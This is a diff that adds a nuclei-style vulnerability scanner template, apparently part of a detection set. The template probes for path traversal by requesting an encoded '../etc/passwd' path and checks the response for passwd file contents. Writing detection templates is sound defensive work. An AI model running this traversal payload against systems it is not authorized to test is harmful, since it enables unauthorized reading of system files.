@@ -1,0 +1,23 @@
+id: avvp-auth-dir-traversal-27
+info:
+  name: Path Traversal Probe
+  severity: high
+  tags:
+  - auth
+  - traversal
+  author: avvp
+  description: Path Traversal Probe nuclei-style detection template.
+metadata:
+  category: auth
+  template_type: detection
+  source: avvp
+requests:
+- method: GET
+  path:
+  - /..%2f..%2fetc/passwd
+  matchers:
+  - type: word
+    words:
+    - 'root:x:'
+    - bin/bash
+    part: body
